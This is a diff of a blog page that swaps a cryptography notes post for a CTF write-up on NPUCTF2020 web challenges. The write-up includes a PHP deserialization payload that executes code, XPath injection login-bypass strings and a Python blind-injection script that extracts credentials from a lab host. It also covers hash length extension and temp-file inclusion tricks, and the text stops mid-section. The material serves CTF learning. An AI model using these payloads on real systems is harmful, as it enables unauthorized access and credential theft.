@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="crypto," />
+  <meta name="keywords" content="bypass,serialize,xpath,hashpump," />
 
 
 
@@ -79,17 +79,42 @@
 
 
 
-<meta name="description" content="在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。">
+<meta name="description" content="还有一个node和cbc字节翻转我这个菜鸡水平看不懂。。。。以后补上">
 <meta property="og:type" content="article">
-<meta property="og:title" content="密码学中一些基本知识">
-<meta property="og:url" content="http://yoursite.com/2020/05/10/note11/index.html">
+<meta property="og:title" content="NPUCTF2020web部分复现">
+<meta property="og:url" content="http://yoursite.com/2020/07/12/NPUCTF2020_web/index.html">
 <meta property="og:site_name" content="Blacknight">
-<meta property="og:description" content="在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。">
-<meta property="article:published_time" content="2020-05-10T12:30:00.000Z">
-<meta property="article:modified_time" content="2020-05-13T14:17:29.701Z">
+<meta property="og:description" content="还有一个node和cbc字节翻转我这个菜鸡水平看不懂。。。。以后补上">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711153556.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154817.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154914.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711175219.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711180024.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192120.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711204336.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711211139.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712095830.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104248.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104552.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105001.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712110818.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114201.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111401.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111918.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114122.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712113629.png">
+<meta property="og:image" content="c:%5CUsers%5C15363%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200712114003065.png">
+<meta property="article:published_time" content="2020-07-12T04:30:00.000Z">
+<meta property="article:modified_time" content="2020-07-12T04:11:17.367Z">
 <meta property="article:author" content="blacknight">
-<meta property="article:tag" content="crypto">
+<meta property="article:tag" content="bypass">
+<meta property="article:tag" content="serialize">
+<meta property="article:tag" content="xpath">
+<meta property="article:tag" content="hashpump">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711153556.png">
 
 
 
@@ -119,13 +144,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/05/10/note11/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/07/12/NPUCTF2020_web/"/>
 
 
 
 
 
-  <title>密码学中一些基本知识 | Blacknight</title>
+  <title>NPUCTF2020web部分复现 | Blacknight</title>
   
 
 
@@ -276,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/10/note11/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/12/NPUCTF2020_web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="blacknight">
@@ -293,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">密码学中一些基本知识</h1>
+          <h1 class="post-title" itemprop="name headline">NPUCTF2020web部分复现</h1>
         
 
         <div class="post-meta">
@@ -305,8 +330,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-10T20:30:00+08:00">
-                2020-05-10
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-12T12:30:00+08:00">
+                2020-07-12
               </time>
             
 
@@ -328,8 +353,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index">
-                    <span itemprop="name">密码学</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -346,8 +371,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2020/05/10/note11/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2020/05/10/note11/" itemprop="commentCount"></span>
+                <a href="/2020/07/12/NPUCTF2020_web/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/07/12/NPUCTF2020_web/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -369,7 +394,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  764
+                  1.6k
                 </span>
               
 
@@ -385,7 +410,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  7
                 </span>
               
             </div>
@@ -406,40 +431,113 @@
       
 
       
-        <p>在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。</p>
+        <p>还有一个node和cbc字节翻转我这个菜鸡水平看不懂。。。。以后补上</p>
 <a id="more"></a>
 
-<h3 id="最基本的求余"><a href="#最基本的求余" class="headerlink" title="最基本的求余"></a>最基本的求余</h3><p>(1) (a + b) mod p = (a mod p + b mod p) mod p<br>(2) (a -  b) mod p = (a mod p - b mod p) mod p<br>(3) (a * b) mod p = (a mod p * b mod p) mod p</p>
-<h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3><p>也称辗转相除法，计算两个正整数的最大公约数，当较小整数为0时，则表明上一次相除已除尽，所以上一次相除时的除数（当次输入的gcd函数中的较大数）是最大公约数。计算公式：</p>
-<p>​                                                                    gcd(a,b) = gcd(b,a mod b)</p>
-<p>a&gt;b且a mod b不为0。</p>
-<p>python递归实现：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a,b = b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = gcd(<span class="number">6</span>,<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+<h3 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h3><p>打开靶机源码处发现页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711153556.png" alt=""></p>
+<p>打开页面得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>
 
-<h3 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h3><p>正整数 a, n，如果有 ax = 1(mod n)，则称 x 的最小正整数解为 a 模 n的逆元。也就是说a和x的乘积模n得到的余数为1，</p>
-<p>关于它的作用及推导过程：<a href="https://blog.csdn.net/weixin_43872728/article/details/99687168" target="_blank" rel="noopener">乘法逆元的作用</a></p>
-<h3 id="拓展欧几里得算法"><a href="#拓展欧几里得算法" class="headerlink" title="拓展欧几里得算法"></a>拓展欧几里得算法</h3><p>在已知a,b两个正整数和欧几里得求得最大公约数d=gcd(a,b)的基础上，存在整数x,y使得ax+by=d成立，也就是 ax+by=gcd(a，b)，如果a,b都是素数，则ax+by=1成立。</p>
-<p>python实现(求逆元)：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myExtGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    a: 模的取值</span></span><br><span class="line"><span class="string">    b: 想求逆的值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, gcd = myExtGCD(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> y, x-a//b*y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(myExtGCD(<span class="number">717</span>, <span class="number">73</span>)[<span class="number">1</span>] % <span class="number">717</span>)</span><br></pre></td></tr></table></figure>
+<p>两个对象创建和销毁时的魔术方法，将传入的data反序列化</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>由<code>__destruct</code>方法可知，会输出<code>$b($a)</code>，所以我们构造函数读取即可，用断言assert，<code>assert(phpinfo())</code>就是输出phpinfo()了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a = <span class="string">"phpinfo()"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">"assert"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:4:"eval";&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p>关于逆元的求解，也可直接导入gmpy2库的invert()函数，同样可得到结果，用法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert()</span><br><span class="line"></span><br><span class="line">ni = invert(a,b)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">a为想逆的值</span></span><br><span class="line"><span class="string">b为模的取值</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print(ni)</span><br></pre></td></tr></table></figure>
+<p>data传入即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154817.png" alt=""></p>
+<p>flag就在这里面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154914.png" alt=""></p>
+<h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><p>首页是一个登录框，session存在期限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711175219.png" alt=""></p>
+<p>抓包重放，同样重放后session失效，应当是设置了csrf-token</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711180024.png" alt=""></p>
+<h4 id="考点：xpath注入"><a href="#考点：xpath注入" class="headerlink" title="考点：xpath注入"></a>考点：xpath注入</h4><p>参考原文地址：<a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" target="_blank" rel="noopener">Tr0y’s Blog</a></p>
+<p>总结一下：</p>
+<p>xpath 是一门在 XML 文档中查找信息的语言。xpath注入主要分为常规注入和布尔盲注</p>
+<p>查询语句如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>
 
-<h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>当有两数a,p满足gcd(a,p)=1，p是质数时，则有 a^{p-1} = 1 (mod p)</p>
-<p>这里可以变形一下，a*a^{p-2} = 1(mod p)</p>
-<p>所以a^(p-2)就是a关于p的逆元，再用快速幂即可求得逆元(直接pow())</p>
-<h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>用希腊字母φ表示,φ(N)表示N的欧拉函数，通俗地理解为小于N且与N互质的数的个数(包含1).</p>
-<p>通式：φ(n)=n<em>(1-1/p1)</em>(1-1/p2)<em>(1-1/p3)</em>(1-1/p4)……(1-1/pn)</p>
-<p>(1)  p^k型:</p>
-<p>若N是质数p(即N=p), φ(n)= φ(p)=p-p^(k-1)=p-1。</p>
-<p>若N是质数p的k次幂(即N=p^k)，φ(n)=p^k-p^(k-1)=(p-1)p^(k-1)。</p>
-<p>(2)mn型</p>
-<p>设n为正整数，以φ(n)表示不超过n且与n互素的正整数的个数，称为n的欧拉函数值。若m,n互质，φ(mn)=(m-1)(n-1)=φ(m)φ(n)。</p>
-<h3 id="欧拉定理及推论"><a href="#欧拉定理及推论" class="headerlink" title="欧拉定理及推论"></a>欧拉定理及推论</h3><p>欧拉定理: 若正整数a，n互质，则a^{φ(n)}≡1 (mod n)，φ(n)为欧拉函数</p>
-<p>推论：若n=pq,p≠q都是素数,k是任意整数,则mk(p-1)(q-1)+1 ≡ m mod n</p>
-<p>​           对任意0≤m≤n，只要选择e,d，满足ed=kφ(n)+1，即ed ≡ 1 mod φ(n) ，d ≡ e-1 mod φ(n)</p>
-<p>待补充</p>
-<p>…</p>
+<p>常规注入如下：</p>
+<p>构造万能密码传入如<code>admin&#39; or &#39;1</code>：(已知admin用户)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;admin&#39; or &#39;1&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>或者<code>&#39; or 1 or &#39;1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&#39; or 1 or &#39;1&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>或节点遍历<code>admin&#39;] | //* | //*[&#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;admin&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>ps：xpath 没有注释一说，所以 payload 要自行构造闭合原语句。</p>
+<p>布尔盲注payload用法主要如下：</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘ or count(/)=<strong>1-&gt;n</strong> or ‘1</td>
+<td align="center">判断根节点数量（n即是根节点的数目）</td>
+</tr>
+<tr>
+<td>‘ or string-length(name(/*[<strong>1-&gt;n</strong>]))=<strong>1-&gt;n</strong> or ‘1</td>
+<td align="center">获取第n个节点的名字长度n</td>
+</tr>
+<tr>
+<td>‘ or substring(name(/*[<strong>1-&gt;n</strong>]), 1, 1)=’<strong>测试字符</strong>‘ or ‘1</td>
+<td align="center">逐位获取第n个节点名</td>
+</tr>
+</tbody></table>
+<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>使用<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;a&#39; or &#39;1</code>猜测根节点字符</p>
+<p>当<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;a&#39; or &#39;1</code>时</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192100.png" alt=""></p>
+<p>当<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;r&#39; or &#39;1</code>时</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192120.png" alt=""></p>
+<p>非法操作，则说明根节点的第一个字符是’r’</p>
+<p>编写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =<span class="string">'http://e2f677a1-4672-4581-81d4-2e82706d0738.node3.buuoj.cn/login.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">find =re.compile(<span class="string">'&lt;input type="hidden" id="token" value="(.*?)" /&gt;'</span>)<span class="comment">#匹配页面token</span></span><br><span class="line"></span><br><span class="line">strs =<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(<span class="string">'------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload = <span class="string">"&lt;username&gt;' or substring(name(/*[1]),&#123;&#125;, 1)='&#123;&#125;' or '1&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"非法操作"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711204336.png" alt=""></p>
+<p>接下来依次跑根节点以下的子节点，直到跑到username和password，替换payload即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> #猜测子节点名称</span><br><span class="line"> payload_2 &#x3D; &quot;&lt;username&gt;&#39; or substring(name(&#x2F;root&#x2F;*[1]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"> </span><br><span class="line"> #猜测accounts的节点</span><br><span class="line">payload_3 &#x3D;&quot;&lt;username&gt;&#39;or substring(name(&#x2F;root&#x2F;accounts&#x2F;*[1]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">#猜测user节点</span><br><span class="line">payload_4 &#x3D;&quot;&lt;username&gt;&#39;or substring(name(&#x2F;root&#x2F;accounts&#x2F;user&#x2F;*[2]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">#跑用户名和密码</span><br><span class="line">payload_username &#x3D;&quot;&lt;username&gt;&#39;or substring(&#x2F;root&#x2F;accounts&#x2F;user[2]&#x2F;username&#x2F;text(),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">payload_password &#x3D;&quot;&lt;username&gt;&#39;or substring(&#x2F;root&#x2F;accounts&#x2F;user[2]&#x2F;password&#x2F;text(),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br></pre></td></tr></table></figure>
+
+<p>最后得到username=adm1n，password=cf7414b5bdb2e65ee43083f4ddbc4d9f，password解码md5得gtfly123</p>
+<p>登录会闪过一句话，抓包截下来是一串base64<code>ZmxhZyBpcyBpbiAvZmxhZwo=</code>解码得flag is in /flag</p>
+<p>url是<code>admin.php?file=welcome</code>，尝试php://filter读取，发现php和base被过滤，大小写绕过</p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711211139.png" alt=""></p>
+<h3 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h3><p>打开靶机只有<code>username/password error</code>，源码处发现注释</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712095830.png" alt=""></p>
+<p>随便传两个值抓包回放</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104248.png" alt=""></p>
+<h4 id="考点1：哈希长度拓展攻击"><a href="#考点1：哈希长度拓展攻击" class="headerlink" title="考点1：哈希长度拓展攻击"></a>考点1：哈希长度拓展攻击</h4><p>哈希长度拓展攻击是利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。 </p>
+<p>可以使用工具hashpump构造payload，用法如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104552.png" alt=""></p>
+<p>官方wp是说可以爆破secret的长度，但这题直接给出了Md5后的hash<code>973225ae4fc8977f86d1a330b0774630</code>，也就是pass。。。。</p>
+<p>那么直接传，发现有跳转flflflflag.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105001.png" alt=""></p>
+<p>打开页面告诉不是flag并存在包含</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105100.png" alt=""></p>
+<p>可以利用伪协议读取源码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712110818.png" alt=""></p>
+<p>再扫一下目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114201.png" alt=""></p>
+<p>config.php还是告诉flag不在这里，dir.php列出了根目录下的文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111401.png" alt=""></p>
+<h4 id="考点2：临时文件包含（-php-7-Segment-Fault-）"><a href="#考点2：临时文件包含（-php-7-Segment-Fault-）" class="headerlink" title="考点2：临时文件包含（ php 7 Segment Fault ）"></a>考点2：临时文件包含（ php 7 Segment Fault ）</h4><p>php代码中使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除</p>
+<p>参考文章：<a href="https://www.anquanke.com/post/id/201136#h2-11" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201136#h2-11</a></p>
+<p>构造上传表单</p>
